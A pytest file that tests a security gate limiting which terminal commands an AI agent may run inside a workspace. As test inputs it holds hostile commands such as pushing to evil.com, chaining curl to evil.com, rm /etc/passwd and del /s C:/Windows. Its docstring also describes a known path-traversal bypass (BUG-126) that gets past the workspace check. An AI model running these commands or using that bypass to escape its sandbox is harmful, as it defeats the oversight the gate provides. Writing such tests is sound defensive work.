r"""SAF-047 Tester - Additional edge-case tests for scoped terminal access.

Attack vectors and boundary conditions not covered by the Developer's tests:

1. URL injection via git push/clone  (SAF-047 URL fix in _try_project_fallback)
2. Venv path outside workspace boundary
3. Windows backslash venv paths: single backslash fails (shlex POSIX backslash=escape);
   double backslash works (shlex reduces to single).
   This is NOT a SAF-047 regression - pre-SAF-047 these were already denied.
4. Case-insensitive deny-zone detection in _check_workspace_path_arg
5. Branch name with .github as substring vs. exact path component
6. Chained commands: allowed verb + denied verb
7. git add with path outside workspace
8. Venv-path-prefixed pip (not just python)
9. Path traversal in _check_workspace_path_arg (KNOWN BUG logged as BUG-126)
10. git reset --hard HEAD (denied combo)
11. git gc --force (not in allowed_subcommands)
12. git clean -f (not in allowed_subcommands, also denied combo)

KNOWN BUG - BUG-126 (logged during this test run):
  _check_workspace_path_arg does not defend against path traversal in absolute
  Windows paths: posixpath.normpath('c:/workspace/project/../../../evil/.venv')
  produces 'evil/.venv' (a relative path, because posixpath treats 'c:' as
  a regular directory component).  _check_workspace_path_arg then anchors
  'evil/.venv' back to the workspace root, making it appear safe.  This allows
  a crafted command like
    c:/workspace/project/../../../evil/.venv/Scripts/python -m pytest tests/
  to normalize to verb='python' while the venv directory is actually outside
  the workspace.  Attack surface limited: Python -m modules are still allow-
  listed to {pytest, build, pip, setuptools, hatchling, venv}.

KNOWN BEHAVIOR - git clone with HTTPS URLs is denied:
  The SAF-047 URL-injection fix in _try_project_fallback rejects any token
  whose posixpath.normpath form matches r'^[a-z][a-z0-9+.\-]*:/' (URL-scheme).
  Before SAF-047, _try_project_fallback would resolve the URL as a project-
  folder-relative path (e.g. ws/project/https:/github.com/...) and classify
  it 'allow'.  After SAF-047 that path is closed.  As a result,
  'git clone https://...' is now denied.  This is stricter security (agents
  should not clone external repos without explicit admin action) but is an
  undocumented behavior change.  Documented here for transparency.
"""
from __future__ import annotations

import sys
import os
from unittest.mock import patch

# ---------------------------------------------------------------------------
# Make security_gate importable
# ---------------------------------------------------------------------------
_SCRIPTS_DIR = os.path.abspath(
    os.path.join(
        os.path.dirname(__file__),
        "..", "..",
        "templates", "agent-workbench",
        ".github", "hooks", "scripts",
    )
)
if _SCRIPTS_DIR not in sys.path:
    sys.path.insert(0, _SCRIPTS_DIR)

import security_gate as sg  # noqa: E402

WS = "c:/workspace"
PROJECT = "project"


def _mock_pf(fn):
    """Decorator that patches detect_project_folder to return 'project'."""
    import functools

    @functools.wraps(fn)
    def wrapper(*args, **kwargs):
        with patch("zone_classifier.detect_project_folder", return_value=PROJECT):
            return fn(*args, **kwargs)

    return wrapper


def allow(cmd: str) -> bool:
    decision, _ = sg.sanitize_terminal_command(cmd, WS)
    return decision == "allow"


def deny(cmd: str) -> bool:
    decision, _ = sg.sanitize_terminal_command(cmd, WS)
    return decision == "deny"


# ===========================================================================
# 1. URL injection via git push origin <url>
# ===========================================================================

@_mock_pf
def test_git_push_url_injection_denied():
    """git push origin https://evil.com must be denied â€” URL must not pass as path inside workspace."""
    # https://evil.com would be treated as a relative path c:/workspace/https:/evil.com
    # by _check_path_arg, which seems allowed, BUT _try_project_fallback now rejects URLs.
    # Without the URL fix, the branch-name segment 'https:/evil.com' would appear to
    # resolve inside the project folder.
    assert deny("git push origin https://evil.com"), (
        "URL injection via git push must be denied (SAF-047 URL fix in _try_project_fallback)"
    )


@_mock_pf
def test_git_push_http_url_injection_denied():
    """git push origin http://attacker.com must be denied."""
    assert deny("git push origin http://attacker.com"), (
        "http:// URL must be denied as git push target"
    )


@_mock_pf
def test_git_clone_url_denied():
    """git clone https://... is denied after the SAF-047 URL fix.

    SAF-047 added URL rejection in _try_project_fallback to prevent URL injection
    via git push origin <url>.  As a side effect, git clone with HTTPS URLs is
    also denied because zone_classifier returns 'deny' for URL paths and the URL
    fallback-fix closes the _try_project_fallback escape hatch.

    This is stricter than pre-SAF-047 behaviour (where the URL was resolved as
    a project-folder path and classified 'allow').  See module docstring for
    details.
    """
    decision, _ = sg.sanitize_terminal_command(
        "git clone https://github.com/user/repo.git", WS
    )
    # SAF-047 URL fix causes this to be denied (stricter, side-effect)
    assert decision == "deny", (
        "git clone https:// is denied after SAF-047 URL fix â€” see module docstring"
    )


# ===========================================================================
# 2. Venv path outside workspace boundary
# ===========================================================================

@_mock_pf
def test_venv_outside_workspace_denied():
    """Python interpreter in a venv outside workspace must be denied."""
    assert deny("../../.venv/Scripts/python -m pytest tests/"), (
        "venv outside workspace must be denied via _check_workspace_path_arg"
    )


@_mock_pf
def test_absolute_venv_outside_workspace_denied():
    """Absolute venv path outside workspace must be denied."""
    assert deny("/home/user/.venv/bin/python -m pytest tests/"), (
        "Absolute venv path outside workspace must be denied"
    )


@_mock_pf
def test_absolute_venv_inside_workspace_allowed():
    """Absolute venv path inside workspace root must be allowed."""
    assert allow(f"{WS}/.venv/Scripts/python -m pytest tests/"), (
        "Absolute venv path inside workspace must be allowed"
    )


# ===========================================================================
# 3. Windows backslash venv paths
# ===========================================================================

@_mock_pf
def test_venv_single_backslash_python_denied():
    """Single-backslash venv path (.venv\\Scripts\\python.exe) is denied.

    When the command string contains a single backslash (Python r-string or
    literal \\S), shlex in POSIX mode treats '\\' as an escape character.
    '\\S' â†’ 'S', so '.venv\\Scripts\\python.exe' becomes the token
    '.venvScriptspython.exe' which is not in the allowlist and is denied.
    This is NOT a SAF-047 regression â€” the same token was denied before
    SAF-047 as an unknown verb.  Users should use forward slashes:
    '.venv/Scripts/python.exe'.
    """
    # Single backslash in Python string literal = one \S in the command
    assert deny(".venv\\Scripts\\python.exe -m pytest tests/"), (
        "Single-backslash venv path must be denied (shlex POSIX escape behaviour)"
    )


@_mock_pf
def test_venv_double_backslash_python_allowed():
    """Double-backslash venv path (.venv\\\\Scripts\\\\python.exe) is allowed.

    When the command string contains double backslashes (e.g. if the shell
    or test passes '\\\\'), shlex POSIX mode reduces '\\\\' â†’ '\\', and then
    verb.replace('\\\\', '/') normalizes to '/', matching the venv regex.
    """
    # Double backslash in Python string literal = two \\S = shell \\S
    # After shlex: \\\\ â†’ \\, then replace('\\', '/') â†’ forward slash
    assert allow(".venv\\\\Scripts\\\\python.exe -m pytest tests/"), (
        "Double-backslash venv path must be allowed after normalization"
    )


@_mock_pf
def test_venv_scripts_python_allowed():
    """.venv/Scripts/python (no .exe) must be allowed."""
    assert allow(".venv/Scripts/python -m pytest tests/"), (
        ".venv/Scripts/python must be allowed"
    )


@_mock_pf
def test_venv_bin_python3_allowed():
    """.venv/bin/python3 (Linux form) must be allowed."""
    assert allow(".venv/bin/python3 -m pytest tests/"), (
        ".venv/bin/python3 must be allowed (Linux venv form)"
    )


@_mock_pf
def test_venv_bin_python311_allowed():
    """.venv/bin/python3.11 (versioned Linux form) must be allowed and normalized."""
    assert allow(".venv/bin/python3.11 -m pytest tests/"), (
        ".venv/bin/python3.11 must be allowed and normalized to python3"
    )


# ===========================================================================
# 4. _check_workspace_path_arg: case insensitivity and edge cases
# ===========================================================================

def test_workspace_path_github_uppercase_denied():
    """.GITHUB (uppercase) path must be denied â€” check is case-insensitive."""
    assert sg._check_workspace_path_arg(f"{WS}/.GITHUB/hooks", WS) is False, (
        ".GITHUB in uppercase must still be denied"
    )


def test_workspace_path_relative_github_inside_workspace_denied():
    """Relative .github path resolving inside workspace must be denied."""
    assert sg._check_workspace_path_arg(".github/hooks/pre-commit", WS) is False


def test_workspace_path_traversal_currently_allows_BUG113():
    """BUG-126: _check_workspace_path_arg does NOT block absolute Windows path traversal.

    posixpath.normpath('c:/workspace/project/../../../etc/passwd') produces
    'etc/passwd' because posixpath treats 'c:' as a regular directory component
    (not a drive letter root), allowing '../../..' to traverse past it.  The
    result is a relative path 'etc/passwd' that _check_workspace_path_arg then
    anchors to the workspace root, making it appear safe.

    This is a known bug logged as BUG-126.  The test asserts the CURRENT
    (buggy) behavior so that any future fix will make it turn red, prompting
    the developer to update the test with the correct assertion.
    """
    result = sg._check_workspace_path_arg(f"{WS}/project/../../../etc/passwd", WS)
    # BUG-126: should be False (deny) but currently returns True (allow)
    assert result is True, (
        "BUG-126: traversal is incorrectly allowed â€” update when fix is applied"
    )


def test_workspace_path_github_as_name_component_denied():
    """.github appearing as an exact path component must be denied."""
    assert sg._check_workspace_path_arg(f"{WS}/docs/.github/config", WS) is False


def test_workspace_path_github_as_filename_suffix_allowed():
    """A file named ending in .github (not exact component) should be allowed.

    e.g. 'my-project.github.md' â€” .github is part of filename, not a directory.
    """
    # parts: ["docs", "my-project.github.md"] â€” neither is exactly ".github"
    assert sg._check_workspace_path_arg(f"{WS}/docs/my-project.github.md", WS) is True, (
        "File named my-project.github.md should be allowed â€” not the .github directory"
    )


def test_workspace_path_relative_no_slash_allowed():
    """A relative token with no path separator (like 'origin') must be allowed."""
    assert sg._check_workspace_path_arg("origin", WS) is True


def test_workspace_path_wildcard_github_prefix_denied():
    """Wildcard that could expand to .github must be denied."""
    assert sg._check_workspace_path_arg(".githu*", WS) is False, (
        "Wildcard .githu* could expand to .github â€” must be denied"
    )


# ===========================================================================
# 5. Branch names: .github as substring vs. exact component
# ===========================================================================

@_mock_pf
def test_git_push_branch_github_exact_component_denied():
    """Branch name using .github as an exact path component must be denied."""
    assert deny("git push origin feature/.github/injected"), (
        "Branch with .github as exact component must be denied"
    )


@_mock_pf
def test_git_push_branch_github_in_name_allowed():
    """Branch name with .github as part of another name should be allowed."""
    # feature/.github-issue-fix â†’ parts: [feature, .github-issue-fix]
    # .github-issue-fix â‰  .github (exact match), so allowed
    assert allow("git push origin feature/.github-issue-fix"), (
        "Branch with .github as part of name (not exact component) should be allowed"
    )


@_mock_pf
def test_git_add_nested_noagentzone_denied():
    """File path inside NoAgentZone at any depth must be denied."""
    assert deny("git add docs/NoAgentZone/secret.txt"), (
        "Path containing NoAgentZone as exact component must be denied"
    )


# ===========================================================================
# 6. Chained commands: allowed verb + denied verb
# ===========================================================================

@_mock_pf
def test_chained_getlocation_and_denied_cmd():
    """get-location ; del /s C:/Windows must be denied (second cmd denied)."""
    assert deny("get-location ; del /s C:/Windows"), (
        "Chained denial: del /s outside workspace must deny the entire command"
    )


@_mock_pf
def test_chained_gl_and_rm_outside_workspace():
    """gl ; rm /etc/passwd must be denied (rm targets outside workspace)."""
    assert deny("gl ; rm /etc/passwd"), (
        "Chained denial: rm /etc/passwd must deny the entire command"
    )


@_mock_pf
def test_chained_git_status_and_curl():
    """git status ; curl https://evil.com must be denied (curl not in allowlist)."""
    assert deny("git status ; curl https://evil.com"), (
        "Chained: curl is not in the allowlist â€” must deny"
    )


# ===========================================================================
# 7. git add with path outside workspace
# ===========================================================================

@_mock_pf
def test_git_add_absolute_outside_workspace_denied():
    """git add with absolute path outside workspace must be denied."""
    assert deny("git add /etc/passwd"), (
        "git add /etc/passwd must be denied (outside workspace)"
    )


@_mock_pf
def test_git_add_absolute_outside_project_folder_denied():
    """git add with absolute path inside workspace root but OUTSIDE project folder is denied.

    The zone model classifies paths as 'allow' only when inside the project
    folder (Project/).  An absolute path like c:/workspace/docs/... is outside
    the project folder (which is c:/workspace/project/), so zone_classifier
    returns 'deny', and the project-folder fallback only applies to relative
    paths.  Result: denied.

    Agents should use relative paths (git add docs/workpackages/SAF-047/)
    which benefit from the _PROJECT_FALLBACK_VERBS mechanism.
    """
    assert deny(f"git add {WS}/docs/workpackages/SAF-047/dev-log.md"), (
        "Absolute workspace-root path outside project folder is denied by zone model"
    )


# ===========================================================================
# 8. Venv-path-prefixed pip normalization
# ===========================================================================

@_mock_pf
def test_venv_pip_allowed_with_active_venv():
    """.venv/Scripts/pip install (with active workspace venv) must be allowed."""
    with patch.dict(os.environ, {"VIRTUAL_ENV": f"{WS}/.venv"}):
        assert allow(".venv/Scripts/pip install requests"), (
            ".venv/Scripts/pip install must be allowed with workspace-local VIRTUAL_ENV"
        )


@_mock_pf
def test_venv_pip_denied_without_active_venv():
    """.venv/Scripts/pip install without VIRTUAL_ENV must be denied."""
    env = {k: v for k, v in os.environ.items() if k != "VIRTUAL_ENV"}
    with patch.dict(os.environ, env, clear=True):
        assert deny(".venv/Scripts/pip install requests"), (
            ".venv/Scripts/pip install must be denied when no VIRTUAL_ENV active"
        )


# ===========================================================================
# 9. Path traversal in workspace path arg
# ===========================================================================

def test_workspace_path_traversal_via_double_dot():
    """../../../etc/passwd must be denied by _check_workspace_path_arg."""
    assert sg._check_workspace_path_arg("../../../etc/passwd", WS) is False


def test_workspace_path_internal_double_dot_stays_inside():
    """Path with ../ that stays inside workspace must be allowed."""
    # c:/workspace/project/../docs = c:/workspace/docs â†’ still inside workspace
    assert sg._check_workspace_path_arg(f"{WS}/project/../docs", WS) is True


# ===========================================================================
# 10. git reset --hard HEAD (denied combo)
# ===========================================================================

@_mock_pf
def test_git_reset_hard_head_denied():
    """git reset --hard HEAD must be denied (reset --hard is a denied combo)."""
    assert deny("git reset --hard HEAD"), (
        "git reset --hard HEAD must be denied"
    )


# ===========================================================================
# 11 & 12. git gc and git clean (not in allowed subcommands)
# ===========================================================================

@_mock_pf
def test_git_gc_denied():
    """git gc must be denied (not in allowed_subcommands)."""
    assert deny("git gc"), (
        "git gc is not in allowed_subcommands â€” must be denied"
    )


@_mock_pf
def test_git_gc_force_denied():
    """git gc --force must be denied."""
    assert deny("git gc --force"), (
        "git gc --force must be denied (not in allowed_subcommands)"
    )


@_mock_pf
def test_git_clean_f_denied():
    """git clean -f must be denied (not in allowed_subcommands)."""
    assert deny("git clean -f"), (
        "git clean -f must be denied (clean not in allowed_subcommands)"
    )


@_mock_pf
def test_git_clean_fd_denied():
    """git clean -fd must be denied."""
    assert deny("git clean -fd"), (
        "git clean -fd must be denied"
    )


# ===========================================================================
# 13. get-location edge cases
# ===========================================================================

@_mock_pf
def test_get_location_no_args_allowed():
    """Get-Location with no arguments must be allowed."""
    assert allow("Get-Location"), "Get-Location must be allowed"


@_mock_pf
def test_get_location_mixed_case_allowed():
    """Get-Location with mixed case must be allowed (case normalization)."""
    assert allow("GET-LOCATION"), "GET-LOCATION (uppercase) must be allowed (case-normalized)"


@_mock_pf
def test_gl_no_args_allowed():
    """gl alias with no arguments must be allowed."""
    assert allow("gl"), "gl must be allowed"


# ===========================================================================
# 14. Venv-python: non-matching executable names (not python/pip)
# ===========================================================================

@_mock_pf
def test_venv_unknown_exe_denied():
    """.venv/Scripts/cmd.exe must NOT be normalized (unknown exe â€” denied)."""
    assert deny(".venv/Scripts/cmd.exe /c echo hello"), (
        ".venv/Scripts/cmd.exe must be denied (not python or pip)"
    )


@_mock_pf
def test_venv_python_with_interactive_flag_denied():
    """.venv/Scripts/python -i (interactive) must be denied after normalization."""
    assert deny(".venv/Scripts/python -i"), (
        ".venv/Scripts/python -i must be denied (interactive flag)"
    )
